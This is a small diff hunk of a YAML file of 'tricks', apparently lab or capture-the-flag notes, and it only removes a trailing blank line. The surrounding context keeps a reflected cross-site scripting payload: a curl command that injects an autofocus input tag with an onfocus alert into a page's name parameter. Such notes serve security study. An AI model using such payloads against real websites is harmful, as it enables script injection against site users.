@@ -37,4 +37,3 @@ tricks:
     how: "GET request to /page with name parameter"
     payload: |
       curl "http://TARGET/page?name=%3Cinput/onfocus=alert(%22XSS%22)/autofocus%3E"
-
